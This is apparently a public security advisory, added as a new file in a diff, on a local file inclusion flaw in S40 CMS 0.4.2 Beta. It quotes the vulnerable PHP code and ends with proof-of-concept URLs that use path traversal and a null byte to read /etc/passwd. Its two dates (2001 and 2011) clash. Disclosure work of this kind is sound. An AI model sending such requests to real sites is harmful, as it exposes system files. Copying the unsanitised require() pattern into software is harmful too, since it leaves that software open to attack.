@@ -1,0 +1,93 @@
+[Security Advisory Details: 07/04/2001]
+
+[Script]        S40 CMS 0.4.2 Beta
+[Location]      http://s40.biz/?p=download
+[Vulnerability] Local File Inclusion
+[Original Adv]  http://y-osirys.com/security/exploits/id27
+[Author]        Giovanni Buzzin, "Osirys"
+[Site]          y-osirys.com
+[Contact]       osirys[at]autistici[dot]org
+
+
+------------------------------------------------------------------------------------------------------------
+[CMS Description]
+
+S40 CMS is FREE Content Management System
+S40 CMS 0.4 beta is lightwieght flat file CMS written on PHP, suitable for small and medium sites. 
+S40 is open-source MIT-license CMS developed by AWEN art studio Ltd.
+S40 is fast and easy to customize system with build-in installer.
+
+
+------------------------------------------------------------------------------------------------------------
+[Security Flaw]
+
+S40 CMS is prone to Local File Inclusion vulnerability because of poor security checks and bad input
+sanitization: GET variables are not properly sanitized before being included via require() PHP function.
+
+[code:index.php]
+
+<?php
+ob_start("ob_gzhandler"); // comment this line to disable gzip compression
+require "inc/config.php";
+require "inc/langs/".$s40[lang]	.".php";
+if ($s40[installed]){
+	require "inc/functions.php";
+	checkinstall();
+	require page($_GET[p],$_GET[c],$_GET[g],$_GET[gp]);
+
+....
+
+[/code]
+
+Having a quick look at page() function, the security issue is clear: $pid ($_GET['p']), is not sanitized
+or passed through a valid regular expression before being returned to require() function of index.php file.
+
+[code:/inc/functions.php:page():line 13]
+
+function page($pid,$cid,$gid,$gp){
+	if(!isset($pid)){
+		$p = "index";
+		return "data/".$p.".page.php";
+	}else{
+		if (isset($pid) and isset($cid)){
+			if(!file_exists("data/".$pid.".child.".$cid.".php")){
+				return "data/404.inc";
+			}else{
+				$p = $pid;
+				$c = $cid;
+				return "data/".$p.".child.".$c.".php";
+			}
+		}else{
+			if(!file_exists("data/".$pid.".page.php")){
+				return "data/404.inc";
+			}else{
+				$p = $pid;
+				return "data/".$p.".page.php";
+			}
+		}
+	}
+}
+....
+
+[/code]
+
+
+------------------------------------------------------------------------------------------------------------
+[Exploit]
+
+The security issue can be exploited sending a valid path via GET request. Null Byte must be used in
+order to exploit this LFI.
+
+PoC : /[cms_path]/?p=[local_file]%00
+      /[cms_path]/?p=/../../../../../../../etc/passwd%00
+
+
+------------------------------------------------------------------------------------------------------------
+[Credits]
+
+Credit goes to Giovanni Buzzin, "Osirys"  for the discover of this vulnerability.
+(Meglio)
+
+
+------------------------------------------------------------------------------------------------------------
+[END: 07/04/2011]
